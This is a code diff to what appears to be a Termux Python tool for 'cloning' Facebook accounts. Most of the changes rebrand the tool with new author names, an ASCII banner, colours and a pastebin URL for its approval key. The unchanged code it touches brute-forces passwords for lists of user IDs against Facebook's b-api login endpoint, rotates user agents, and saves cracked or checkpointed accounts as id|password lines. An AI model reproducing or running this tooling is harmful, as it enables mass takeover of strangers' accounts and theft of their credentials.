@@ -78,9 +78,9 @@ def clear():
 def back():
 	login()
 
-ah="King-"
+ah="OSAMA-"
 imt="-M4786=="
-ak="syed -"
+ak="KING -"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ BALOCH ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ SYED] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -379,20 +379,29 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m
-    
- ██████╗ ███████╗ █████╗ ███╗   ███╗ █████╗ 
-██╔═══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗
-██║   ██║███████╗███████║██╔████╔██║███████║
-██║   ██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║
-╚██████╔╝███████║██║  ██║██║ ╚═╝ ██║██║  ██║
- ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
-                                            
-                                    
+       
+\033[1;32m██████╗ ███████╗ █████╗ ███╗   ███╗ █████╗ 
+\033[1;33m██╔═══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗
+\033[1;32m██║   ██║███████╗███████║██╔████╔██║███████║
+\033[1;33m██║   ██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║
+\033[1;32m╚██████╔╝███████║██║  ██║██║ ╚═╝ ██║██║  ██║
+\033[1;33m ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
+
+
+
+
+
+
+\033[1;32mNAM TO SUNA HOGA OSAMA
+\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
+\033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
+        
+ 
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-  Admin  :  MUHAMMAD USAMA ALBALOSHI
-  \033[1;32mYouTube  : Syed Tricks
-  \033[1;33mFecbook   :  Muhammad Usama
-  \033[1;32mContact :  03317394634
+  \033[1;32mAuther  : OSAMA
+  \033[1;33mYouTube : Syed Tricks
+  \033[1;32mFecbook : MUHAMMAD OSAMA
+   \033[1;33m Admin. : OSAMA
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -404,7 +413,7 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     Unsubscribe krne Wale Ki Approvel Ura Di Jy Gi")
+		print("\033[1;36m     UNSUSCRIBE KARNE WALON KA APROVEL URA DEYA JAIGA")
 		print("")
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
@@ -419,7 +428,7 @@ class Main:
 			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Type Your Channel Name In Shorts")
+			print("\033[1;33m    Apna nam type kro")
 			print("")
 			input("\n\033[1;32m  Type Name ==> \033[1;36m")
 			time.sleep(2.1)
@@ -429,12 +438,12 @@ class Main:
 			os.system("clear")
 		
 			print(logo)
-		print("\n [1] File Cloning")
-		print(" [2] Public Cloning")
-		print(" [3] Create File")
-		print(" [4] 2009-10 Cloning")
-		print(" [5] 2011-14 Cloning")
-		print(" [E] Exit \n")
+		print("\n\033[1;32m [1] File Cloning")
+		print(" [2]\033[1;33m Public Cloning")
+		print(" [3]\033[1;32m Create File")
+		print(" [4]\033[1;33m 2009-10 Cloning")
+		print(" [5]\033[1;32m 2011-14 Cloning")
+		print(" [E]\033[1;33m Exit \n")
 		Ali =input(" Choose : ")
 		if Ali in ["1", "01"]:
 			File()
@@ -847,7 +856,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ OSAMA ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ BALOCH ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -864,7 +873,7 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ OSAMA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OSAMA -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
@@ -1311,7 +1320,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://pastebin.com/raw/WhpNW014").text
+	r1=requests.get("https://pastebin.com/raw/EHpFPtEz").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1324,14 +1333,14 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m syed Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;33m Note : syed Free  HA JANI LOG \033[1;37m")
+		print(" \033[1;32m SYED Toll Free BUT You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : OSAMA FREE HA BHAIYO ENJOYA   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+ah+key1 )
+		print (" Your Key : "+ak+ah +key1 )
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
